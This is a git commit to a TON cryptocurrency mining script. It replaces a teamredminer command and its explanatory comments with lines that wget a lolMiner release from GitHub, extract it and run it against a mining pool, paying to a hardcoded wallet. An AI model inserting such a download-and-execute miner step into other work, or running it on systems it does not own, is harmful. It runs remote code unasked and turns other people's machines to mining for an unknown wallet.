00f8c7e51abdc007a2f419c1861f348716bb845b
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-08 18:24:27 +0700

    Update start_ton.sh

--- start_ton.sh
+++ start_ton.sh
@@ -1,11 +1,5 @@
 #!/bin/sh
 
-# Example bat file for mining TON with teamredminer. PLEASE REPLACE the example wallet and workername below
-# unless you're just doing a quick test.
-#
-# Note that TRM doesn't support all TON pools. Please check the most recent version of the TON_MINING.txt
-# guide included in the release package, or read it online here:
-#
-# https://github.com/todxx/teamredminer/tree/master/doc
-
-./teamredminer -a ton -o stratum+tcp://eu1.stratum.ton-pool.com:443/stratum -u EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ -p 1
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz
+tar -xvf lolMiner_v1.41b_Lin64.tar.gz && cd 1.41b
+./lolMiner --algo TON --pool wss://eu1.stratum.ton-pool.com/stratum --user EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
